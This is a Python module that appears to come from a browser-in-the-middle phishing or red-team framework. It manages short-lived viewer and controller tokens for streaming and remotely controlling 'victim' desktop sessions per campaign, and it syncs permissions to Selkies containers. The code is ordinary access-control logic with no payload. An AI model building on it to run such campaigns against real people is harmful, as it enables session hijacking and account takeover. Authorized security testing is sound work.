"""Short-lived, server-side capabilities for victim desktop streams."""

from __future__ import annotations

import asyncio
import hashlib
import logging
import secrets
import time
from dataclasses import dataclass
from urllib.parse import quote

import httpx

from config import settings
from core.gateway_auth import VICTIM_ID_PATTERN
from core.victim_auth import derive_selkies_master_token


logger = logging.getLogger(__name__)


def _digest(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()


@dataclass(frozen=True)
class StreamGrant:
    victim_id: str
    route_handle: str
    role: str
    expires_at: float
    client_token: str


@dataclass(frozen=True)
class ConsumedGrant:
    victim_id: str
    role: str
    expires_at: float
    client_token: str
    session_token: str


class StreamAccessManager:
    """Own capabilities in campaign memory and synchronize Selkies permissions."""

    def __init__(self) -> None:
        self._bootstraps: dict[str, StreamGrant] = {}
        self._sessions: dict[str, StreamGrant] = {}
        self._client_grants: dict[str, dict[str, StreamGrant]] = {}
        self._routes: dict[str, str] = {}
        self._victim_routes: dict[str, str] = {}
        self._expiry_tasks: dict[tuple[str, str], asyncio.Task] = {}
        self._lock = asyncio.Lock()

    @staticmethod
    def _validate(victim_id: str, role: str) -> None:
        if not VICTIM_ID_PATTERN.fullmatch(victim_id):
            raise ValueError("Invalid victim ID")
        if role not in {"viewer", "controller"}:
            raise ValueError("Invalid stream role")

    def _prune_locked(self, now: float) -> None:
        self._bootstraps = {
            key: grant
            for key, grant in self._bootstraps.items()
            if grant.expires_at > now
        }
        self._sessions = {
            key: grant
            for key, grant in self._sessions.items()
            if grant.expires_at > now
        }
        for victim_id, grants in list(self._client_grants.items()):
            live = {
                token: grant
                for token, grant in grants.items()
                if grant.expires_at > now
            }
            if live:
                self._client_grants[victim_id] = live
            else:
                self._client_grants.pop(victim_id, None)

    async def _sync_selkies_locked(self, victim_id: str) -> None:
        permissions = {
            token: {
                "role": grant.role,
                "slot": None,
                "mk_control": grant.role == "controller",
            }
            for token, grant in self._client_grants.get(victim_id, {}).items()
        }
        master_token = derive_selkies_master_token(
            settings.INTERNAL_API_KEY,
            victim_id,
        )
        url = (
            f"http://p-bitm-{settings.CAMPAIGN_ID}-{victim_id}:8083/tokens"
        )
        async with httpx.AsyncClient(timeout=5.0) as client:
            response = await client.post(
                url,
                headers={"Authorization": f"Bearer {master_token}"},
                json=permissions,
            )
            response.raise_for_status()

    async def issue(
        self,
        victim_id: str,
        role: str,
        ttl_seconds: int,
    ) -> str:
        self._validate(victim_id, role)
        ttl = max(30, min(int(ttl_seconds), 86400))
        now = time.time()
        client_token = secrets.token_urlsafe(32)
        bootstrap_token = secrets.token_urlsafe(32)
        async with self._lock:
            self._prune_locked(now)
            route_handle = self._victim_routes.get(victim_id)
            if route_handle is None:
                route_handle = secrets.token_urlsafe(16)
            grant = StreamGrant(
                victim_id,
                route_handle,
                role,
                now + ttl,
                client_token,
            )
            self._client_grants.setdefault(victim_id, {})[client_token] = grant
            self._routes[route_handle] = victim_id
            self._victim_routes[victim_id] = route_handle
            self._bootstraps[_digest(bootstrap_token)] = grant
            if settings.CAMPAIGN_PROTOCOL == "selkies":
                try:
                    await self._sync_selkies_locked(victim_id)
                except Exception:
                    self._client_grants.get(victim_id, {}).pop(client_token, None)
                    self._bootstraps.pop(_digest(bootstrap_token), None)
                    raise
            task_key = (victim_id, client_token)
            self._expiry_tasks[task_key] = asyncio.create_task(
                self._expire_client_token(victim_id, client_token, ttl)
            )

        base_path = (
            f"/{settings.CAMPAIGN_ID}"
            if settings.ENVIRONMENT != "production"
            else ""
        )
        return (
            f"{base_path}/{settings.STREAM_PATH}/{quote(route_handle, safe='')}"
            f"/access/{quote(bootstrap_token, safe='')}"
        )

    async def _expire_client_token(
        self,
        victim_id: str,
        client_token: str,
        ttl_seconds: int,
    ) -> None:
        try:
            await asyncio.sleep(ttl_seconds)
            async with self._lock:
                grants = self._client_grants.get(victim_id, {})
                if grants.pop(client_token, None) is None:
                    return
                if not grants:
                    self._client_grants.pop(victim_id, None)
                if settings.CAMPAIGN_PROTOCOL == "selkies":
                    try:
                        await self._sync_selkies_locked(victim_id)
                    except httpx.HTTPError:
                        logger.warning(
                            "Could not remove expired Selkies token for %s",
                            victim_id,
                        )
        finally:
            self._expiry_tasks.pop((victim_id, client_token), None)

    async def consume(
        self,
        route_handle: str,
        bootstrap_token: str,
    ) -> ConsumedGrant | None:
        now = time.time()
        async with self._lock:
            self._prune_locked(now)
            grant = self._bootstraps.pop(_digest(bootstrap_token), None)
            if not grant or grant.route_handle != route_handle:
                return None
            session_token = secrets.token_urlsafe(32)
            self._sessions[_digest(session_token)] = grant
            return ConsumedGrant(
                victim_id=grant.victim_id,
                role=grant.role,
                expires_at=grant.expires_at,
                client_token=grant.client_token,
                session_token=session_token,
            )

    async def authorize(
        self,
        route_handle: str,
        session_token: str | None,
    ) -> str | None:
        if not session_token:
            return None
        now = time.time()
        async with self._lock:
            self._prune_locked(now)
            grant = self._sessions.get(_digest(session_token))
            if (
                grant
                and grant.route_handle == route_handle
                and self._routes.get(route_handle) == grant.victim_id
            ):
                return grant.victim_id
            return None

    async def revoke_victim(self, victim_id: str) -> None:
        async with self._lock:
            self._bootstraps = {
                key: grant
                for key, grant in self._bootstraps.items()
                if grant.victim_id != victim_id
            }
            self._sessions = {
                key: grant
                for key, grant in self._sessions.items()
                if grant.victim_id != victim_id
            }
            self._client_grants.pop(victim_id, None)
            route_handle = self._victim_routes.pop(victim_id, None)
            if route_handle:
                self._routes.pop(route_handle, None)
            for key, task in list(self._expiry_tasks.items()):
                if key[0] == victim_id:
                    task.cancel()
                    self._expiry_tasks.pop(key, None)


stream_access = StreamAccessManager()
